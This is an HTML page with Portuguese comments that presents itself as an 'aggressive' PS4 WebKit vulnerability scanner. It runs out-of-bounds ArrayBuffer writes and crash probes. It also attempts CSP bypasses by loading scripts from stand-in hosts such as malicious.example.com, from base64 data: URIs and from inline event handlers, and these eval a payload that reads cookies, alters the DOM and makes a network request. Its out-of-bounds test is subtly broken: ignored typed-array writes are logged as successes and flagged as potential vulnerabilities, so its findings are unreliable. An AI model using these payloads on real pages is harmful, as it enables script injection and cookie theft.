<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</title>
    <style>
        /* Estilos CSS permanecem os mesmos */
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { background: #111; border: 1px solid #333; padding: 15px; height: 600px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
        #browserInfo { margin-bottom: 15px; border: 1px solid #555; padding: 10px; }
        button { background: #f44336; color: white; border: none; padding: 8px 15px; margin: 5px; border-radius: 3px; }
        select { background: #222; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
        .success { color: #4CAF50; }
        .danger { color: #f44336; }
        .warning { color: #FFC107; }
        .info { color: #2196F3; }
        .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
        .poc-potential { color: #FF9800; font-weight: bold; }
        .defense-bypass { color: #00BCD4; font-weight: bold; }
        .privilege-escalation { color: #FF4081; font-weight: bold; }
        .impact { color: #E91E63; font-style: italic; }
    </style>
</head>
<body>
    <h1>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</h1>

    <div id="browserInfo">
        <strong>User Agent:</strong> <span id="userAgent"></span><br>
        <strong>Platform:</strong> <span id="platform"></span><br>
    </div>

    <div>
        <select id="testSelector">
            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact)</option>
            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
            <option value="oob_impact_tests">OOB Impact Demonstration Tests</option>
            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact)</option>
            </select>
        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
        <button onclick="clearLog()">Clear Log</button>
    </div>

    <div id="log"></div>

<script>
// ======================
// Coleta de Informa√ß√µes e Logging
// ======================
document.addEventListener('DOMContentLoaded', function() {
    const userAgentElement = document.getElementById('userAgent');
    const platformElement = document.getElementById('platform');
    try {
        if (userAgentElement) userAgentElement.textContent = navigator.userAgent;
    } catch (e) { console.error("Error getting userAgent:", e); if (userAgentElement) userAgentElement.textContent = "N/A"; }
    try {
        if (platformElement) platformElement.textContent = navigator.platform;
    } catch (e) { console.error("Error getting platform:", e); if (platformElement) platformElement.textContent = "N/A"; }
});

function log(message, type = '') {
    const logDiv = document.getElementById('log');
    if (logDiv) {
        const line = document.createElement('div');
        const timestamp = `[${new Date().toLocaleTimeString()}] `;
        const textNode = document.createTextNode(timestamp + message.replace(/<[^>]*>/g, '')); // Basic sanitation
        if (type && message.startsWith('<span')) { // Allow specific span tags from tests
             line.innerHTML = timestamp + message;
             if (type) line.classList.add(...type.split(' '));
        } else {
            line.appendChild(textNode);
            if (type) line.className = type;
        }
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
    } else {
        console.error("Error: #log element not found!");
    }
}

function clearLog() {
    const logDiv = document.getElementById('log');
    if (logDiv) {
        logDiv.innerHTML = '';
    }
}

// Flag global APENAS para OOB
var potentialVulnsFound = {
    oobWrite: false
};

// ======================
// Fun√ß√µes Auxiliares para Demonstra√ß√£o de Impacto (globais)
// ======================
function demonstrateCookieRead() {
    try {
        const cookies = document.cookie || '(no cookies found or readable)';
        log('[IMPACT-CSP] Cookie Read Attempt Result: ' + cookies, 'impact danger');
    } catch(e) {
        log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger');
    }
}

function demonstrateDomManipulation() {
    try {
        const divId = 'csp-impact-div-' + Date.now();
        const div = document.createElement('div');
        div.id = divId;
        div.style.position = 'fixed';
        div.style.top = '0'; div.style.left = '0'; div.style.width = '100%';
        div.style.background = 'red'; div.style.color = 'white';
        div.style.textAlign = 'center'; div.style.padding = '10px';
        div.style.zIndex = '9999';
        div.textContent = '!! CSP Bypass Impact: DOM Manipulation Successful !!';
        const oldDiv = document.getElementById('csp-impact-div-active');
        if(oldDiv) { try{ document.body.removeChild(oldDiv); } catch(e){} }
        div.id = 'csp-impact-div-active';
        document.body.appendChild(div);
        log('[IMPACT-CSP] DOM Manipulation Executed: Injected red bar.', 'impact danger');
    } catch(e) {
        log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger');
    }
}

function demonstrateNetworkRequest() {
    const targetUrl = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; // Exemplo
    try {
        log('[IMPACT-CSP] Attempting network request (fetch) to ' + targetUrl + '...', 'info');
        fetch(targetUrl)
            .then(response => {
                if (response.ok) {
                    log('[IMPACT-CSP] Network Request Successful: Received response from ' + targetUrl + '. Status: ' + response.status, 'impact danger');
                } else {
                    log('[IMPACT-CSP] Network Request Failed: Received non-OK response from ' + targetUrl + '. Status: ' + response.status, 'warning');
                }
            })
            .catch(error => {
                log('[IMPACT-CSP] Network Request Error: Could not fetch ' + targetUrl + '. Error: ' + error.message, 'warning');
                log('[IMPACT-CSP] Note: Check CSP connect-src, CORS, network issues.', 'info');
            });
    } catch(e) {
        log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger');
    }
}

// ======================
// Aggressive POC Tests (Com Impacto Direto no CSP)
// ======================
const aggressiveTests = {

    // --- Teste OOB Original ---
    "oob_write_aggressive": async function() {
        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write Investigation...", "info");
        potentialVulnsFound.oobWrite = false; // Reset flag
        try {
            const bufferSize = 32;
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);
            const writeValue = 0xEE;
            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10, bufferSize * 2, bufferSize * 10];
            const readOffsets = [-5, 0, 5, bufferSize - 5, bufferSize - 1, bufferSize, bufferSize + 5];

            for (const writeOffset of offsets) {
                log(`[OOB-AGG] Attempting to write 0x${writeValue.toString(16)} at offset ${writeOffset}...`, "info");
                try {
                    view[writeOffset] = writeValue;
                    log(`‚ö†Ô∏è OOB write at offset ${writeOffset} successful (no error).`, "warning");
                     potentialVulnsFound.oobWrite = true;

                    for (const readOffset of readOffsets) {
                        try {
                            await new Promise(resolve => setTimeout(resolve, 50));
                            const readValue = view[readOffset];
                            log(`[OOB-AGG] Read 0x${(readValue !== undefined ? readValue.toString(16) : 'undef')} at offset ${readOffset} after write at ${writeOffset}.`, "info");

                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && (writeOffset >= bufferSize || writeOffset < 0)) {
                                log(`<span class="poc-potential defense-bypass privilege-escalation">üö© Potential OOB Write Corruption: Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at IN-BOUNDS offset ${readOffset}.</span>`, "danger");
                            }
                        } catch (readError) {
                             log(`‚ö†Ô∏è Error reading at offset ${readOffset}: ${readError.message}`, "warning");
                        }
                    }
                } catch (writeError) {
                    log(`‚úÖ OOB write at offset ${writeOffset} blocked/error: ${writeError.message}`, "success");
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            log("[OOB-AGG] Completed aggressive OOB write testing.", "info");

        } catch (e) {
            log(`‚ùå Test error (OOB Write): ${e.message}`, "danger");
            console.error(e);
        }
    },

    // --- Testes de Impacto OOB ---
    "test_oob_metadata": async function() {
        log("[IMPACT-OOB] Attempting OOB write to corrupt metadata (e.g., length)...", "section");
        if (!potentialVulnsFound.oobWrite) {
             log("Skipping OOB impact test: Initial OOB write did not seem possible.", "warning");
             return;
        }
        try {
            const bufferSize = 32;
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);
            const initialLength = buffer.byteLength;
            log(`[IMPACT-OOB] Initial buffer length: ${initialLength}`, "info");
            const suspectOffsets = [-8, -4, bufferSize];
            const writeValue = 0xFF;

            for(const offset of suspectOffsets) {
                try {
                    log(`[IMPACT-OOB] Attempting OOB write 0x${writeValue.toString(16)} at offset ${offset} to hit metadata...`, "info");
                    view[offset] = writeValue;
                    log(`[IMPACT-OOB] OOB write at offset ${offset} successful (no error). Checking length...`, "warning");
                     await new Promise(resolve => setTimeout(resolve, 100));
                    const currentLength = buffer.byteLength;
                    log(`[IMPACT-OOB] Buffer length after write at ${offset}: ${currentLength}`, "info");
                    if (currentLength !== initialLength) {
                        log(`<span class="poc-potential privilege-escalation impact">üö® Potential Metadata Corruption: Buffer length changed from ${initialLength} to ${currentLength} after OOB write at offset ${offset}!</span>`, "danger impact");
                        try {
                             log(`[IMPACT-OOB] Attempting access using potentially corrupted length ${currentLength}...`, "info");
                             const corruptedView = new Uint8Array(buffer, 0, currentLength);
                             log(`[IMPACT-OOB] Access using new length ${currentLength} seems possible. Last byte: ${corruptedView[currentLength-1]?.toString(16)}`, "warning");
                        } catch(e_access) {
                             log(`[IMPACT-OOB] Error accessing buffer with corrupted length ${currentLength}: ${e_access.message}`, "danger");
                        }
                        return;
                    }
                } catch(e_write) {
                     log(`[IMPACT-OOB] OOB Write at ${offset} failed: ${e_write.message}`, "success");
                }
            }
             log("[IMPACT-OOB] Metadata corruption test finished, no length change detected with tested offsets.", "info");
        } catch (e) {
            log(`‚ùå Test error (OOB Metadata): ${e.message}`, "danger");
             console.error(e);
        }
    },

    "test_oob_crash_probe": async function() {
        log("[IMPACT-OOB] Attempting OOB writes with large offsets/values to probe for crashes...", "section");
         if (!potentialVulnsFound.oobWrite) {
             log("Skipping OOB crash probe: Initial OOB write did not seem possible.", "warning");
             return;
        }
        try {
            const bufferSize = 32;
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);
            const largeOffsets = [bufferSize * 100, bufferSize * 1000, 0xFFFF, 0xFFFFF, 0xFFFFFF];
            const largeValues = [0xFF, 0xDEAD, 0xBEEF, 0xCAFE];

            for (const offset of largeOffsets) {
                 for (const value of largeValues) {
                    log(`[IMPACT-OOB-CRASH] Attempting OOB write 0x${value.toString(16)} at large offset ${offset}... (Browser may crash)`, "warning");
                     try {
                         view[offset] = value & 0xFF;
                         log(`[IMPACT-OOB-CRASH] Write at ${offset} completed without immediate error.`, "info");
                          await new Promise(resolve => setTimeout(resolve, 200));
                     } catch (e_write) {
                         log(`[IMPACT-OOB-CRASH] Write at ${offset} failed: ${e_write.message}. Likely blocked or invalid offset.`, "success");
                         break;
                     }
                 }
                  await new Promise(resolve => setTimeout(resolve, 500));
            }
            log("[IMPACT-OOB-CRASH] Crash probe finished. If browser didn't crash, these specific writes were handled.", "info");

        } catch (e) {
            log(`‚ùå Test error (OOB Crash Probe): ${e.message}. Browser might have crashed earlier.`, "danger");
             console.error(e);
        }
    },


    // --- Teste CSP (Modificado para Impacto Direto) ---
     "csp_bypass_aggressive": async function() {
        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (with Direct Impact Demo)...", "info");

        // ---- Preparar Payloads de Impacto ----
        const impactPayloadJsString = `
            console.log('Executing CSP Bypass Payload...');
            demonstrateCookieRead();
            demonstrateDomManipulation();
            demonstrateNetworkRequest();
            console.log('CSP Bypass Payload Execution Finished.');
        `.replace(/\n\s*/g, '');

        let impactPayloadBase64 = '';
        try {
             impactPayloadBase64 = btoa(impactPayloadJsString);
             log("[CSP-AGG] Generated Base64 payload for impact tests.", "info");
        } catch (e) {
             log("Error generating Base64 payload: " + e.message, "danger");
             return;
        }

        const impactPayloadInlineString = `
            console.log('Executing Inline CSP Bypass Payload via event...');
            demonstrateCookieRead();
            demonstrateDomManipulation();
            demonstrateNetworkRequest();
            console.log('Inline CSP Payload Execution Finished.');
        `.replace(/\n\s*/g, '').replace(/"/g, '&quot;');

        // ---- Fontes a Testar ----
        const scriptSources = [
             `data:text/javascript;base64,${impactPayloadBase64}`,
            'http://malicious.example.com/script.js',
            'https://malicious.example.com/script.js',
            'blob:null/someBlob',
            'javascript:console.log("javascript: URI executed - CSP Bypass?")',
            'vbscript:msgbox("vbscript executed - CSP Bypass?")',
            'ftp://malicious.example.com/script.js',
            '//malicious.example.com/script.js',
        ];

        // ---- Teste com <script src="..."> ----
        for (const src of scriptSources) {
            log(`[CSP-AGG] Attempting script injection with src: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "info");
            await new Promise(resolve => {
                 const script = document.createElement('script');
                 const cleanup = () => {
                     try { document.body.removeChild(script); } catch(e) {}
                     resolve();
                 };
                 script.onerror = () => {
                     log(`‚ö†Ô∏è Script load error (potential CSP block) for: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "warning");
                     cleanup();
                 };
                 script.onload = () => {
                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">üö© CSP Bypass Possible & Impact Executed: Script loaded from ${src.substring(0,30)}...</span>`, "danger impact");
                     cleanup();
                 };
                 try {
                    script.src = src;
                    document.body.appendChild(script);
                    setTimeout(() => {
                         if (script.parentNode) {
                              log(`‚ö†Ô∏è Script load timeout/no event (potential CSP block or invalid src) for: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "warning");
                              cleanup();
                         }
                    }, 1500);
                 } catch(e) {
                     log(`‚ùå Error trying to set src/append script ${src.substring(0,100)}${src.length > 100 ? '...' : ''}: ${e.message}`, "danger");
                     cleanup();
                 }
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }

        // ---- Teste com script inline em atributos de evento ----
        log("[CSP-AGG] Attempting inline script injection via event attributes (with Direct Impact Demo)...", "info");
        const eventAttributes = ['onerror', 'onload']; // Focar nestes

        for (const attr of eventAttributes) {
            log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
            await new Promise(async resolve => {
                const testElement = document.createElement('img');
                let bypassDetected = false;
                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;

                window[uniqueWrapperName] = () => {
                     if (!bypassDetected) {
                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">üö© CSP Bypass Possible & Impact Executed: Inline script via ${attr} triggered!</span>`, "danger impact");
                         bypassDetected = true;
                     }
                     try {
                        // Executar o payload de impacto. Precisamos reverter o escaping para eval.
                        eval(impactPayloadInlineString.replace(/&quot;/g, '"'));
                     } catch(evalError) {
                         log(`Error executing inline impact payload via ${attr}: ${evalError.message}`, 'danger');
                     }
                     console.log(`Inline payload potentially executed via ${attr}`);
                };

                const inlineCode = `try { window['${uniqueWrapperName}'](); } catch(e) { console.error('Error in inline wrapper execution:', e); }`;
                testElement.setAttribute(attr, inlineCode);

                if (attr === 'onerror') {
                     testElement.src = 'invalid-image-source-' + Math.random();
                } else if (attr === 'onload') {
                     testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
                }

                document.body.appendChild(testElement);
                await new Promise(resolve => setTimeout(resolve, 500));

                if (!bypassDetected) {
                   log(`[CSP-AGG] Inline script via ${attr} likely blocked or event not triggered.`, "info");
                }

                try { document.body.removeChild(testElement); } catch(e){}
                delete window[uniqueWrapperName];
                resolve();
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }

        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact).", "info");
    },

    // --- Executor Principal (Atualizado) ---
    "all_aggressive": async function() {
        log("=== Running All Aggressive Tests (Direct Impact Version) ===", "section");

        await aggressiveTests["oob_write_aggressive"]();
        log("Pausing for 5 seconds after OOB write tests before OOB impact tests...", "info");
        await new Promise(resolve => setTimeout(resolve, 5000));

        if (potentialVulnsFound.oobWrite) {
             await aggressiveTests["test_oob_metadata"]();
             await new Promise(resolve => setTimeout(resolve, 1000));
             await aggressiveTests["test_oob_crash_probe"]();
              log("Pausing for 5 seconds after OOB impact tests before CSP tests...", "info");
             await new Promise(resolve => setTimeout(resolve, 5000));
        } else {
             log("Skipping OOB impact tests as initial OOB write seemed unsuccessful.", "warning");
        }

        await aggressiveTests["csp_bypass_aggressive"](); // J√° inclui o impacto CSP

        log("\n=== All Aggressive Tests (Direct Impact Version) Completed. Review logs and browser behavior thoroughly. ===", "section");
    },

     // Mant√©m a op√ß√£o de rodar s√≥ OOB Impact
     "oob_impact_tests": async function() {
        log("=== Running OOB Impact Tests Only ===", "section");
          // Adicionado check da flag oobWrite aqui tamb√©m
          if (!potentialVulnsFound.oobWrite) {
             log("Skipping OOB impact test: Initial OOB write did not seem possible or wasn't run.", "warning");
             return;
          }
          await aggressiveTests["test_oob_metadata"]();
          await new Promise(resolve => setTimeout(resolve, 1000));
          await aggressiveTests["test_oob_crash_probe"]();
          log("\n=== OOB Impact Tests Completed ===", "section");
     }

};

// ======================
// Test Runner (Atualizado)
// ======================
async function runSelectedTest() {
    const testSelector = document.getElementById('testSelector');
    const selectedTest = testSelector.value;

    // Adicionar checagem para OOB Impact caso OOB n√£o tenha rodado antes / n√£o funcionado
    if (selectedTest === "oob_impact_tests" && !potentialVulnsFound.oobWrite) {
        log("Warning: Running OOB Impact tests, but the main OOB write test wasn't run or didn't detect potential success. Results might be limited.", "warning");
        // Resetar a flag aqui pode ser perigoso se o usu√°rio rodar OOB Write e depois s√≥ Impact
        // Melhor deixar como est√° e s√≥ avisar. Ou for√ßar rodar o OOB Write primeiro?
        // Por seguran√ßa, vamos apenas avisar.
    }

    clearLog();
    log("=== Starting Selected Tests ===", "section");

    if (aggressiveTests[selectedTest]) {
        await aggressiveTests[selectedTest]();
        log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs and browser behavior closely. ===`, "section");
    } else {
        log(`Error: Test "${selectedTest}" not found.`, "danger");
    }
}
</script>
</body>
</html>
